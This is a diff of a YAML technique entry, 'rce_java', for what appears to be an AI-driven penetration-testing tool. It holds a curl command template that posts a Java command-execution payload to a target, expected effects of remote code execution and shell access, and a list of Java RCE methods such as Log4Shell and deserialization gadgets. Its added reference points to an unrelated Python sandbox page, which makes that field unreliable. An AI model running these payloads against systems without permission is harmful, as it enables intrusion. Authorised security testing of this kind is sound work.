@@ -2,15 +2,20 @@ name: rce_java
 category: web
 description: Java RCE techniques
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}' -d 'input=Runtime.getRuntime().exec("id")'"
-parser: null
+command_template: 'curl -s ''{target_url}'' -d ''input=Runtime.getRuntime().exec("id")''
+
+  '
+parser: web_response_parser
 expected_effects:
-  - action_completed
+- rce_achieved
+- shell_obtained
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Java RCE: deserialization (ysoserial gadgets), JNDI injection (Log4Shell), OGNL injection (Struts), EL injection (JSP/JSF), XXE in XML parsers."
+mechanism: 'Java RCE: deserialization (ysoserial gadgets), JNDI injection (Log4Shell),
+  OGNL injection (Struts), EL injection (JSP/JSF), XXE in XML parsers.'
+hacktricks_ref: generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md
